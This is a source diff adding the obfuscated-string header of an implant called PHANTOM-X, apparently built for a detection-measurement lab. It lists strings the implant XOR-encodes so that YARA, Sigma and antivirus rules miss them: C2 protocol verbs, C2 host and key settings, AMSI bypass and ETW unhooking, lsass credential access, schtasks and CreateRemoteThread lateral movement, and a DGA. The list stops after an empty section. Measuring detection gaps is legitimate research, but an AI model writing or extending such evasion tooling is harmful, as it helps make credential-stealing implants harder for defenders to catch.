@@ -1,0 +1,118 @@
+/* ================================================================== */
+/* PHANTOM-X :: sensitive string table                                 */
+/* ================================================================== */
+/*                                                                        */
+/* One list, used by two things:                                        */
+/*                                                                        */
+/*   tools/gen_strings.py   reads it and emits px_strings.h with the    */
+/*                          plaintext XOR-encoded                        */
+/*   px_obfuscate.c         decodes them at runtime                      */
+/*                                                                        */
+/* The list is here rather than in the generator so that the two cannot */
+/* drift apart. The generator parses this file; it does not have its    */
+/* own copy of the strings.                                             */
+/*                                                                        */
+/* WHY THESE STRINGS                                                    */
+/*     These are the strings a defender greps for. A YARA rule, a       */
+/*     Sigma rule, an AV heuristic or a human with `strings.exe` looks  */
+/*     for exactly these. Encoding them removes the pattern, which is   */
+/*     the point: it is what lets the lab MEASURE how much of a       */
+/*     detection depends on a plaintext string being present.           */
+/*                                                                        */
+/* The variant build is measured against the baseline build. If the    */
+/* baseline is detected and the variant is not, that gap is the        */
+/* finding.                                                             */
+/*                                                                        */
+/* Add a string with X(NAME, "text") below, then re-run the generator. */
+/* ================================================================== */
+
+/* X(id, plaintext) */
+#define PX_STR_LIST(X)                                                        \
+    /* --- execution ---------------------------------------------------- */  \
+    X(CMD_PREFIX, "cmd /c ")                                                \
+    X(CMD_EXE, "cmd.exe")                                                   \
+    /* --- modules ------------------------------------------------------ */  \
+    X(WS2_32, "ws2_32.dll")                                                 \
+    X(KERNEL32, "kernel32.dll")                                             \
+    X(NTDLL, "ntdll.dll")                                                   \
+    X(AMSI_DLL, "amsi.dll")                                                 \
+    X(AMSI_SCAN, "AmsiScanBuffer")                                         \
+    X(ETW_WRITE, "EtwEventWrite")                                           \
+    /* --- protocol ----------------------------------------------------- */  \
+    X(PROTO_HELLO, "HELLO|")                                                \
+    X(PROTO_RESULT, "RESULT|")                                              \
+    X(PROTO_EXEC, "EXEC|")                                                  \
+    X(PROTO_REACH, "PING")                                                  \
+    X(PROTO_ANSWER, "PONG\r\n")                                             \
+    X(PROTO_STOP, "EXIT")                                                   \
+    X(PROTO_CAPS, "CAPS|")                                                  \
+    X(PROTO_CRED, "CRED|")                                                  \
+    X(PROTO_LATERAL, "LATERAL|")                                            \
+    /* --- environment overrides ---------------------------------------- */  \
+    X(ENV_C2_HOST, "PX_C2_HOST")                                            \
+    X(ENV_C2_PORT, "PX_C2_PORT")                                            \
+    X(ENV_C2_KEY, "PX_C2_KEY")                                              \
+    X(DEFAULT_KEY, "phantomx-lab-key-0123456789abcdef")                     \
+    X(ENV_TRACE, "PX_TRACE")                                                  \
+    /* --- report text ------------------------------------------------- */  \
+    X(TXT_LSASS_FAIL, "OpenProcess(VM_READ) on lsass.exe (pid %d) failed, ")\
+    X(TXT_AMSI_FAIL, "AMSI bypass not applied (amsi.dll absent)")          \
+    X(TXT_NO_CRED_DATA, "credential collection returned no data")          \
+    X(TXT_NO_CRED, "this build has no credential access capability")       \
+    X(TXT_NO_LATERAL, "this build has no lateral movement capability")      \
+    X(TXT_CAPS_MASK, "CAPS|%lu")                                            \
+    X(TXT_HELLO_FMT, "HELLO|%s|%lu|%s")                                    \
+    X(TXT_RESULT_FMT, "RESULT|%s|%s|%ld")                                  \
+    X(TXT_MARKER_FMT, "px_payload executed\r\n  pid  : %lu\r\n  host : %s\r\n  time : %04lu-%02lu-%02lu %02lu:%02lu:%02lu\r\n")\
+    X(TXT_DGA_HOST, "DGA host: %s\n")                                       \
+    X(TXT_ENCRYPT_ON, "channel encryption enabled\n")                       \
+    X(TXT_ENCRYPT_OFF, "channel encryption unavailable (no key)\n")        \
+    X(TXT_ETW_OK, "ETW unhooked\n")                                         \
+    X(TXT_ETW_FAIL, "ETW unhook failed\n")                                  \
+    X(TXT_AMSI_OK, "AMSI bypass applied\n")                                \
+    X(TXT_CRED_PREFIX, "CRED %s : %s\n")                                    \
+    X(TXT_LATERAL_PREFIX, "LATERAL %s : %s\n")                              \
+    X(TXT_LATERAL_RPT, "lateral to %s via schtasks: rc=%ld %s")             \
+    X(TXT_CRED_RPT, "lsass pid=%d window=0x%llx read=%lu bytes ")          \
+    X(TXT_CRED_BLOCKS, "cred_blocks=%d sample=%s")                          \
+    X(TXT_NO_RESOLVE, "cannot resolve %s\n")                               \
+    X(TXT_EXEC_FMT, "EXEC %s : %s\n")                                       \
+    X(TXT_CAPS_FMT, "CAPS|%lu")                                            \
+    X(TXT_MARKER_NAME, "px_payload_running.txt")                            \
+    X(TXT_LOG_NAME, "px_payload_log.txt")                                   \
+    X(TXT_PING_REPLY, "PONG")                                               \
+    X(TXT_EXIT_RECEIVED, "EXIT received\n")                                \
+    X(TXT_LOG_EXIT, "[px] EXIT received\n")                                \
+    X(TXT_LOG_EXEC, "[px] EXEC %s : %s\n")                                  \
+    X(TXT_LOG_AMSI_FAIL, "[px] AMSI bypass not applied (amsi.dll absent or not patchable)\n")\
+    X(TXT_LOG_AMSI_OK, "[px] AMSI bypass applied\n")                       \
+    X(TXT_LOG_ETW_OK, "[px] ETW unhooked\n")                                \
+    X(TXT_LOG_ETW_FAIL, "[px] ETW unhook failed\n")                         \
+    X(TXT_LOG_ENC_ON, "[px] channel encryption enabled\n")                  \
+    X(TXT_LOG_ENC_OFF, "[px] channel encryption unavailable (no key)\n")   \
+    X(TXT_LOG_DGA, "[px] DGA host: %s\n")                                   \
+    X(TXT_LOG_CRED, "[px] CRED %s : %s\n")                                 \
+    X(TXT_LOG_LATERAL, "[px] LATERAL %s : %s\n")                           \
+    X(TXT_LOG_FRAME_BAD, "[px] frame failed to decode\n")                  \
+    X(TXT_LOG_NO_RESOLVE, "[px] cannot resolve %s\n")                      \
+    X(TXT_LOG_CLOSED, "[px] connection closed by peer\n")                   \
+    X(TXT_LOG_LARGE, "[px] encrypted frame too large, sending clear\n")    \
+    X(TXT_LOG_WS_FAIL, "[px] LoadLibrary ws2_32 failed (%lu)\n")          \
+    X(TXT_LOG_WS_EXPORTS, "[px] ws2_32 exports missing\n")                \
+    X(TXT_LOG_WSA_FAIL, "[px] WSAStartup failed\n")                       \
+    X(TXT_LOG_SOCK_FAIL, "[px] socket failed (%lu)\n")                    \
+    X(TXT_LOG_CONNECTING, "[px] connecting to %s:%d\n")                   \
+    X(TXT_LOG_CONN_FAIL, "[px] connect failed (%lu)\n")                  \
+    X(TXT_LOG_CONNECTED, "[px] connected\n")                               \
+    X(TXT_LOG_FRAME_LEN, "[px] bad frame length %lu\n")                   \
+    X(TXT_LOG_FINISHED, "[px] finished\n")                                 \
+    X(TXT_LOG_ENC_STATE, "[px] channel encryption %s\n")                  \
+    /* --- credential access -------------------------------------------- */  \
+    X(LSASS_EXE, "lsass.exe")                                               \
+    X(TOOLHELP32, "CreateToolhelp32Snapshot")                               \
+    X(PROC32FIRST, "Process32First")                                        \
+    X(PROC32NEXT, "Process32Next")                                          \
+    /* --- lateral movement --------------------------------------------- */  \
+    X(SCHTASKS, "schtasks.exe")                                            \
+    X(CREATEREMOTE, "CreateRemoteThread")                                  \
+    /* --- marker file --------------------------------------------------- */  \
